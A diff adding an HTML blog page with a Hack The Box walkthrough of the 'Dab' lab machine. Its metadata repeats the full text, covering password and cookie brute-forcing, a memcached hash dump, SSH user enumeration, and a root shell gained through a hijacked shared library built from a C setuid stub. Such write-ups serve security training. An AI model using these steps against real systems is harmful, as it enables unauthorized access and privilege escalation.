@@ -1,0 +1,431 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
+<title>Hack The Box - Dab | 0xRick Owned Root !</title>
+<meta name="generator" content="Jekyll v3.7.4" />
+<meta property="og:title" content="Hack The Box - Dab" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Quick Summary Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in. Nmap As always we will start by running nmap note : I added the ip to /etc/hosts as dab.htb nmap -sV -sT -sC dab.htb We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx. Let’s take a look at the ftp server. FTP anonymous login suceeds , then by listing the files we only see one file dab.jpg We will download it get dab.jpg then we will take a look at that image. Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpg And for password I left it blank and it was accepted ! Next step is to extract that txt file steghide extract -sf dab.jpg Cool let’s cat it. And , Nope… So we just got trolled , next thing is to look at http Check out my steganography list HTTP On port 80 there’s a login page. And port 8080 tells us : Access denied: password authentication cookie not set Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuff And port 8080 had nothing. HTTP port 80 Let’s enumerate the first port and see what we can get. The most common credentials admin:admin didn’t work and we get Error: Login failed If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and password At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version. Fuzzing with ZAP First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from Seclists Let’s start zap and intercept the request again. Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value. Add –&gt; Add then we paste the wordlist contents. all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password. And we get it in , but … Nothing interesting , was this port important ? correct me if i’m wrong. HTTP port 8080 Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie. Let’s add a cookie and name it password , value can be anything we’re just testing We got another message : Access denied: password authentication cookie incorrect So we just need to get the right value of the cookie and we will get in. We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ Then we will terminate it immediately and look how can we filter the output All the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 chars wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 secret gave us a response of 540 , let’s try in burp next step is to add the cookie , you can use any cookie editor. after that we get this page. Finally we got something memcached The very first thing we see is : “Status of cache engine: Online” cache engine ? after some googling we will find a software called memcached https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1 By default, memcached uses the following settings: • Memory allocation of 64MB • Listens for connections on all network interfaces, using port 11211 • Supports a maximum of 1024 simultaneous connections -page 5 So we know that memcached runs on port 11211 , let’s try any port to test We get an internal server error Now let’s try port 11211 We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right. Now we need to know what to put in “line to send” By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet) Full output : STAT 1:chunk_size 96 STAT 1:chunks_per_page 10922 STAT 1:total_pages 1 STAT 1:total_chunks 10922 STAT 1:used_chunks 0 STAT 1:free_chunks 10922 STAT 1:free_chunks_end 0 STAT 1:mem_requested 0 STAT 1:get_hits 0 STAT 1:cmd_set 0 STAT 1:delete_hits 0 STAT 1:incr_hits 0 STAT 1:decr_hits 0 STAT 1:cas_hits 0 STAT 1:cas_badval 0 STAT 1:touch_hits 0 STAT 16:chunk_size 2904 STAT 16:chunks_per_page 361 STAT 16:total_pages 1 STAT 16:total_chunks 361 STAT 16:used_chunks 1 STAT 16:free_chunks 360 STAT 16:free_chunks_end 0 STAT 16:mem_requested 2880 STAT 16:get_hits 0 STAT 16:cmd_set 2 STAT 16:delete_hits 0 STAT 16:incr_hits 0 STAT 16:decr_hits 0 STAT 16:cas_hits 0 STAT 16:cas_badval 0 STAT 16:touch_hits 0 STAT 26:chunk_size 27120 STAT 26:chunks_per_page 38 STAT 26:total_pages 1 STAT 26:total_chunks 38 STAT 26:used_chunks 1 STAT 26:free_chunks 37 STAT 26:free_chunks_end 0 STAT 26:mem_requested 24699 STAT 26:get_hits 440 STAT 26:cmd_set 7 STAT 26:delete_hits 0 STAT 26:incr_hits 0 STAT 26:decr_hits 0 STAT 26:cas_hits 0 STAT 26:cas_badval 0 STAT 26:touch_hits 0 STAT active_slabs 3 STAT total_malloced 3127416 END By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 0 0 for no result limit We get ITEM users So we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes. SSH enumeration and getting user Let’s copy that output and save it on our box. I saved it in a file and called it users.txt cat users.txt And it’s a lot of unorganized data , 3 or more pages like this. we will use a python module called json.tool to make get a more clear output cat users.txt | python -m json.tool &gt; users2.txt cat users2.txt And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them. cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d &#39;&quot;&#39; -f 2 &gt; usernames.txt cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d &#39;&quot;&#39; -f 2 &gt; hashes.txt To bruteforce ssh we will use a metasploit module called ssh_enumusers msfconsole use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS dab.htb set USER_FILE usernames.txt set THREADS 20 It will run for a while , then it will tell us that it found the user genevieve now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txt And finally we have valid credentials genevieve:Princess1 , let’s ssh Finally , we owned user ! More enumeration We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder. It gets us a root shell then immediately dies after the first command. We got trolled again :D find / -perm -4000 to search for suid binaries and we see something unusual. A binary called myexec has suid permissions. Let’s see what’s that. It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password. Getting the password scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box Then we will use radare2 radare2 myexec aaa pdf @ main The password is s3cur3l0g1n , let’s get back to the box and try it And we get: password is correct seclogin() called TODO: Placeholder for now, function not implemented yet so what can we do now ? Hijacking dynamically linked shared object library and getting root If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so and we saw earlier when we executed the binary : seclogin() called So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that. We will create a directory in /home/genevieve/ and call it .exploit Then we will write a small c program that spawns bash. #include &lt;stdio.h&gt; seclogin() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.c Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it. Then to activate that path we will execute this command ldconfig This page helped a lot. Let’s do ldd again: The path changed and pointed to our fake library. Let’s own root. ./myexec And we owned root. That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. previous Hack The Box write-up : Hack The Box - Secnotes" />
+<meta property="og:description" content="Quick Summary Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in. Nmap As always we will start by running nmap note : I added the ip to /etc/hosts as dab.htb nmap -sV -sT -sC dab.htb We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx. Let’s take a look at the ftp server. FTP anonymous login suceeds , then by listing the files we only see one file dab.jpg We will download it get dab.jpg then we will take a look at that image. Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpg And for password I left it blank and it was accepted ! Next step is to extract that txt file steghide extract -sf dab.jpg Cool let’s cat it. And , Nope… So we just got trolled , next thing is to look at http Check out my steganography list HTTP On port 80 there’s a login page. And port 8080 tells us : Access denied: password authentication cookie not set Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuff And port 8080 had nothing. HTTP port 80 Let’s enumerate the first port and see what we can get. The most common credentials admin:admin didn’t work and we get Error: Login failed If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and password At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version. Fuzzing with ZAP First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from Seclists Let’s start zap and intercept the request again. Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value. Add –&gt; Add then we paste the wordlist contents. all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password. And we get it in , but … Nothing interesting , was this port important ? correct me if i’m wrong. HTTP port 8080 Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie. Let’s add a cookie and name it password , value can be anything we’re just testing We got another message : Access denied: password authentication cookie incorrect So we just need to get the right value of the cookie and we will get in. We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ Then we will terminate it immediately and look how can we filter the output All the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 chars wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 secret gave us a response of 540 , let’s try in burp next step is to add the cookie , you can use any cookie editor. after that we get this page. Finally we got something memcached The very first thing we see is : “Status of cache engine: Online” cache engine ? after some googling we will find a software called memcached https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1 By default, memcached uses the following settings: • Memory allocation of 64MB • Listens for connections on all network interfaces, using port 11211 • Supports a maximum of 1024 simultaneous connections -page 5 So we know that memcached runs on port 11211 , let’s try any port to test We get an internal server error Now let’s try port 11211 We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right. Now we need to know what to put in “line to send” By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet) Full output : STAT 1:chunk_size 96 STAT 1:chunks_per_page 10922 STAT 1:total_pages 1 STAT 1:total_chunks 10922 STAT 1:used_chunks 0 STAT 1:free_chunks 10922 STAT 1:free_chunks_end 0 STAT 1:mem_requested 0 STAT 1:get_hits 0 STAT 1:cmd_set 0 STAT 1:delete_hits 0 STAT 1:incr_hits 0 STAT 1:decr_hits 0 STAT 1:cas_hits 0 STAT 1:cas_badval 0 STAT 1:touch_hits 0 STAT 16:chunk_size 2904 STAT 16:chunks_per_page 361 STAT 16:total_pages 1 STAT 16:total_chunks 361 STAT 16:used_chunks 1 STAT 16:free_chunks 360 STAT 16:free_chunks_end 0 STAT 16:mem_requested 2880 STAT 16:get_hits 0 STAT 16:cmd_set 2 STAT 16:delete_hits 0 STAT 16:incr_hits 0 STAT 16:decr_hits 0 STAT 16:cas_hits 0 STAT 16:cas_badval 0 STAT 16:touch_hits 0 STAT 26:chunk_size 27120 STAT 26:chunks_per_page 38 STAT 26:total_pages 1 STAT 26:total_chunks 38 STAT 26:used_chunks 1 STAT 26:free_chunks 37 STAT 26:free_chunks_end 0 STAT 26:mem_requested 24699 STAT 26:get_hits 440 STAT 26:cmd_set 7 STAT 26:delete_hits 0 STAT 26:incr_hits 0 STAT 26:decr_hits 0 STAT 26:cas_hits 0 STAT 26:cas_badval 0 STAT 26:touch_hits 0 STAT active_slabs 3 STAT total_malloced 3127416 END By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 0 0 for no result limit We get ITEM users So we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes. SSH enumeration and getting user Let’s copy that output and save it on our box. I saved it in a file and called it users.txt cat users.txt And it’s a lot of unorganized data , 3 or more pages like this. we will use a python module called json.tool to make get a more clear output cat users.txt | python -m json.tool &gt; users2.txt cat users2.txt And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them. cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d &#39;&quot;&#39; -f 2 &gt; usernames.txt cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d &#39;&quot;&#39; -f 2 &gt; hashes.txt To bruteforce ssh we will use a metasploit module called ssh_enumusers msfconsole use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS dab.htb set USER_FILE usernames.txt set THREADS 20 It will run for a while , then it will tell us that it found the user genevieve now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txt And finally we have valid credentials genevieve:Princess1 , let’s ssh Finally , we owned user ! More enumeration We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder. It gets us a root shell then immediately dies after the first command. We got trolled again :D find / -perm -4000 to search for suid binaries and we see something unusual. A binary called myexec has suid permissions. Let’s see what’s that. It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password. Getting the password scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box Then we will use radare2 radare2 myexec aaa pdf @ main The password is s3cur3l0g1n , let’s get back to the box and try it And we get: password is correct seclogin() called TODO: Placeholder for now, function not implemented yet so what can we do now ? Hijacking dynamically linked shared object library and getting root If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so and we saw earlier when we executed the binary : seclogin() called So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that. We will create a directory in /home/genevieve/ and call it .exploit Then we will write a small c program that spawns bash. #include &lt;stdio.h&gt; seclogin() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.c Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it. Then to activate that path we will execute this command ldconfig This page helped a lot. Let’s do ldd again: The path changed and pointed to our fake library. Let’s own root. ./myexec And we owned root. That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. previous Hack The Box write-up : Hack The Box - Secnotes" />
+<link rel="canonical" href="http://localhost:4000/hack-the-box/dab/" />
+<meta property="og:url" content="http://localhost:4000/hack-the-box/dab/" />
+<meta property="og:site_name" content="0xRick Owned Root !" />
+<meta property="og:image" content="http://localhost:4000/hackthebox/dab/0.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2019-02-02T00:00:00+02:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","headline":"Hack The Box - Dab","dateModified":"2019-02-02T00:00:00+02:00","url":"http://localhost:4000/hack-the-box/dab/","datePublished":"2019-02-02T00:00:00+02:00","image":"http://localhost:4000/hackthebox/dab/0.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/dab/"},"description":"Quick Summary Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in. Nmap As always we will start by running nmap note : I added the ip to /etc/hosts as dab.htb nmap -sV -sT -sC dab.htb We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx. Let’s take a look at the ftp server. FTP anonymous login suceeds , then by listing the files we only see one file dab.jpg We will download it get dab.jpg then we will take a look at that image. Nothing really special , maybe steganography ? Let’s try steghide steghide info dab.jpg And for password I left it blank and it was accepted ! Next step is to extract that txt file steghide extract -sf dab.jpg Cool let’s cat it. And , Nope… So we just got trolled , next thing is to look at http Check out my steganography list HTTP On port 80 there’s a login page. And port 8080 tells us : Access denied: password authentication cookie not set Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only /login and /login. Normal stuff And port 8080 had nothing. HTTP port 80 Let’s enumerate the first port and see what we can get. The most common credentials admin:admin didn’t work and we get Error: Login failed If we intercept the request with burp we will see that the login process is being handled through a POST request with the parameters username and password At this point we can bruteforce passwords with hydra , but instead of that i just used ZAP fuzzer , you can also use burp intruder but it’s very slow in the community version. Fuzzing with ZAP First thing to mention is the wordlist , because we are bruteforcing remotely it’s better to use a small wordlist so we won’t use rockyou here. I used darkweb2017-top10000.txt from Seclists Let’s start zap and intercept the request again. Then right click –&gt; attack –&gt; fuzzer . After that we highlight the place we want to fuzz , that will be the password parameter value. Add –&gt; Add then we paste the wordlist contents. all the responses will be 200 and 542 bytes , except one response 302 and 209 bytes , for the value Password1 so that’s the password. And we get it in , but … Nothing interesting , was this port important ? correct me if i’m wrong. HTTP port 8080 Moving on to the next http port , let’s intercept the request with burp and see what can we do with that password authentication cookie. Let’s add a cookie and name it password , value can be anything we’re just testing We got another message : Access denied: password authentication cookie incorrect So we just need to get the right value of the cookie and we will get in. We will use wfuzz to fuzz the cookie wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ Then we will terminate it immediately and look how can we filter the output All the responses has 324 chars so we will add --hh 324 and this will not show us any response with 324 chars wfuzz -u http://dab.htb:8080/ -w darkweb2017-top10000.txt -b password=FUZZ --hh 324 secret gave us a response of 540 , let’s try in burp next step is to add the cookie , you can use any cookie editor. after that we get this page. Finally we got something memcached The very first thing we see is : “Status of cache engine: Online” cache engine ? after some googling we will find a software called memcached https://downloads.mysql.com/docs/mysql-memcached-en.a4.pdf memcached is a simple, highly scalable key-based cache that stores data and objects wherever dedicated or spare RAM is available for quick access by applications, without going through layers of parsing or disk I/O. To use, you run the memcached command on one or more hosts and then use the shared cache to store objects. -page 1 By default, memcached uses the following settings: • Memory allocation of 64MB • Listens for connections on all network interfaces, using port 11211 • Supports a maximum of 1024 simultaneous connections -page 5 So we know that memcached runs on port 11211 , let’s try any port to test We get an internal server error Now let’s try port 11211 We get output : ERROR because we didn’t send a valid command , but that’s a confirmation that the port is right. Now we need to know what to put in “line to send” By looking at this cheat sheet , the first command we see is get which reads a value , first time i did this box i guessed it , just typed get users and it worked but the right way to do it is to query the memory statistics with stats slabs (as mentioned in the cheat sheet) Full output : STAT 1:chunk_size 96 STAT 1:chunks_per_page 10922 STAT 1:total_pages 1 STAT 1:total_chunks 10922 STAT 1:used_chunks 0 STAT 1:free_chunks 10922 STAT 1:free_chunks_end 0 STAT 1:mem_requested 0 STAT 1:get_hits 0 STAT 1:cmd_set 0 STAT 1:delete_hits 0 STAT 1:incr_hits 0 STAT 1:decr_hits 0 STAT 1:cas_hits 0 STAT 1:cas_badval 0 STAT 1:touch_hits 0 STAT 16:chunk_size 2904 STAT 16:chunks_per_page 361 STAT 16:total_pages 1 STAT 16:total_chunks 361 STAT 16:used_chunks 1 STAT 16:free_chunks 360 STAT 16:free_chunks_end 0 STAT 16:mem_requested 2880 STAT 16:get_hits 0 STAT 16:cmd_set 2 STAT 16:delete_hits 0 STAT 16:incr_hits 0 STAT 16:decr_hits 0 STAT 16:cas_hits 0 STAT 16:cas_badval 0 STAT 16:touch_hits 0 STAT 26:chunk_size 27120 STAT 26:chunks_per_page 38 STAT 26:total_pages 1 STAT 26:total_chunks 38 STAT 26:used_chunks 1 STAT 26:free_chunks 37 STAT 26:free_chunks_end 0 STAT 26:mem_requested 24699 STAT 26:get_hits 440 STAT 26:cmd_set 7 STAT 26:delete_hits 0 STAT 26:incr_hits 0 STAT 26:decr_hits 0 STAT 26:cas_hits 0 STAT 26:cas_badval 0 STAT 26:touch_hits 0 STAT active_slabs 3 STAT total_malloced 3127416 END By looking at the slab with id 26 we see that the chunk size of it is 27120 , let’s dump the keys for this slab stats cachedump 26 0 0 for no result limit We get ITEM users So we do get users , however you can just guess it like I said. We get a huge json output of usernames and password hashes. SSH enumeration and getting user Let’s copy that output and save it on our box. I saved it in a file and called it users.txt cat users.txt And it’s a lot of unorganized data , 3 or more pages like this. we will use a python module called json.tool to make get a more clear output cat users.txt | python -m json.tool &gt; users2.txt cat users2.txt And it’s nice now. Let’s make a seperate file for users to use them as a list to bruteforce ssh , and another seperate file for hashes to crack them. cat users2.txt | cut -d &quot;:&quot; -f 1 | cut -d &#39;&quot;&#39; -f 2 &gt; usernames.txt cat users2.txt | cut -d &quot;:&quot; -f 2 | cut -d &#39;&quot;&#39; -f 2 &gt; hashes.txt To bruteforce ssh we will use a metasploit module called ssh_enumusers msfconsole use auxiliary/scanner/ssh/ssh_enumusers set RHOSTS dab.htb set USER_FILE usernames.txt set THREADS 20 It will run for a while , then it will tell us that it found the user genevieve now we need to get the password of that user. You can use john , hashcat or online crackers , however I have already cracked them and only few ones are crackable : Now we need to know which one of these passwords is genevieve’s password , so we will grep for genevieve in users2.txt then we will grep for the hash in cracked-hashes.txt And finally we have valid credentials genevieve:Princess1 , let’s ssh Finally , we owned user ! More enumeration We have a password , let’s try sudo -l , and we see that we can run this binary as root /usr/bin/try_harder , and as the name said … we should really try harder. It gets us a root shell then immediately dies after the first command. We got trolled again :D find / -perm -4000 to search for suid binaries and we see something unusual. A binary called myexec has suid permissions. Let’s see what’s that. It asks for a password and of course “test” is refused , we need to reverse engineer this binary to find the password. Getting the password scp genevieve@dab.htb:/usr/bin/myexec /root/Desktop/HTB/boxes/dab to download the file on our box Then we will use radare2 radare2 myexec aaa pdf @ main The password is s3cur3l0g1n , let’s get back to the box and try it And we get: password is correct seclogin() called TODO: Placeholder for now, function not implemented yet so what can we do now ? Hijacking dynamically linked shared object library and getting root If we run ldd (List Dynamic Dependencies) against that binary. we see libseclogin.so and we saw earlier when we executed the binary : seclogin() called So theoretically , if we can replace libseclogin.so with another one and link to it , the binary will execute it as root. let’s test that. We will create a directory in /home/genevieve/ and call it .exploit Then we will write a small c program that spawns bash. #include &lt;stdio.h&gt; seclogin() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); } After that we will compile it gcc -fPIC -shared -o libseclogin.so exploit.c Now our fake libseclogin.so is ready , we need to make the system point to our path /home/genevieve/.exploit/libseclogin.so instead of /usr/lib/libseclogin.so We will cd to /etc/ld.so.conf.d , and create a .conf file and put our path in it. Then to activate that path we will execute this command ldconfig This page helped a lot. Let’s do ldd again: The path changed and pointed to our fake library. Let’s own root. ./myexec And we owned root. That’s it , Feedback is appreciated ! Don’t forget to read the previous write-ups , Tweet about the write-up if you liked it , follow on twitter for awesome resources @Ahm3d_H3sham Thanks for reading. previous Hack The Box write-up : Hack The Box - Secnotes","@context":"http://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/ad.css">
+  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-97164925-2');
+</script>
+
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - Dab</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2019-02-02T00:00:00+02:00" itemprop="datePublished">Feb 2, 2019
+      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
+</p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <hr />
+
+<h3 id="quick-summary">Quick Summary</h3>
+<h4 id="hey-guys-today-dab-retired-and-this-is-my-write-up-dab-was-a-nice-box-a-hard-one-but-it-had-some-funny-stuff-too--getting-user-was-really-annoying-because-it-had-a-lot-of-rabbit-holes-root-was-much-better-its-a-linux-box-and-its-ip-is-10101086-so-lets-jump-right-in">Hey guys today dab retired and this is my write-up. Dab was a nice box ,A hard one but it had some funny stuff too , getting user was really annoying because it had a lot of rabbit holes. Root was much better. It’s a linux box and it’s ip is 10.10.10.86 so let’s jump right in.</h4>
+<p><img src="/images/hackthebox/dab/0.png" alt="" /></p>
+<hr />
+
+<h3 id="nmap">Nmap</h3>
+<h4 id="as-always-we-will-start-by-running-nmap">As always we will start by running nmap</h4>
+<h4 id="note--i-added-the-ip-to-etchosts-as-dabhtb">note : I added the ip to <code class="highlighter-rouge">/etc/hosts</code> as dab.htb</h4>
+<p><code class="highlighter-rouge">nmap -sV -sT -sC dab.htb</code>
+<img src="/images/hackthebox/dab/1.png" alt="" /></p>
+<h4 id="we-find-ftp-on-port-21--ssh-on-port-22--http-on-port-80-and-8080-both-of-them-are-nginx">We find ftp on port 21 , ssh on port 22 , http on port 80 and 8080 both of them are nginx.</h4>
+<h4 id="lets-take-a-look-at-the-ftp-server">Let’s take a look at the ftp server.</h4>
+<p><br /></p>
+<hr />
+
+<h3 id="ftp">FTP</h3>
+<h4 id="anonymous-login-suceeds--then-by-listing-the-files-we-only-see-one-file-dabjpg">anonymous login suceeds , then by listing the files we only see one file <code class="highlighter-rouge">dab.jpg</code></h4>
+<p><img src="/images/hackthebox/dab/2.png" alt="" /></p>
+<h4 id="we-will-download-it-get-dabjpg-then-we-will-take-a-look-at-that-image">We will download it <code class="highlighter-rouge">get dab.jpg</code> then we will take a look at that image.</h4>
+<p><img src="/images/hackthebox/dab/dab.jpg" alt="" /></p>
+<h4 id="nothing-really-special--maybe-steganography--lets-try-steghide">Nothing really special , maybe steganography ? Let’s try steghide</h4>
+<p><code class="highlighter-rouge">steghide info dab.jpg</code>
+<img src="/images/hackthebox/dab/3.png" alt="" /></p>
+<h4 id="and-for-password-i-left-it-blank-and-it-was-accepted-">And for password I left it blank and it was accepted !</h4>
+<h4 id="next-step-is-to-extract-that-txt-file">Next step is to extract that txt file</h4>
+<p><code class="highlighter-rouge">steghide extract -sf dab.jpg</code>
+<img src="/images/hackthebox/dab/4.png" alt="" /></p>
+<h4 id="cool-lets-cat-it">Cool let’s <code class="highlighter-rouge">cat</code> it.</h4>
+<p><img src="/images/hackthebox/dab/5.png" alt="" /></p>
+<h4 id="and--nope">And , Nope…</h4>
+<h4 id="so-we-just-got-trolled--next-thing-is-to-look-at-http">So we just got trolled , next thing is to look at http</h4>
+<h4 id="check-out-my-steganography-list">Check out my <a href="/lists/stego">steganography list</a></h4>
+<p><br /></p>
+<hr />
+
+<h3 id="http">HTTP</h3>
+<h4 id="on-port-80-theres-a-login-page">On port 80 there’s a login page.</h4>
+<p><img src="/images/hackthebox/dab/6.png" alt="" /></p>
+<h4 id="and-port-8080-tells-us--access-denied-password-authentication-cookie-not-set">And port 8080 tells us : <code class="highlighter-rouge">Access denied: password authentication cookie not set</code></h4>
+<p><img src="/images/hackthebox/dab/7.png" alt="" /></p>
+<h4 id="bruteforcing-sub-directories-with-gobuster-wasnt-helpful--port-80-had-only-login-and-login-normal-stuff">Bruteforcing sub directories with gobuster wasn’t helpful , port 80 had only <code class="highlighter-rouge">/login</code> and <code class="highlighter-rouge">/login</code>. Normal stuff</h4>
+<p><img src="/images/hackthebox/dab/8.png" alt="" /></p>
+<h4 id="and-port-8080-had-nothing">And port 8080 had nothing.</h4>
+<p><img src="/images/hackthebox/dab/9.png" alt="" /></p>
+<hr />
+
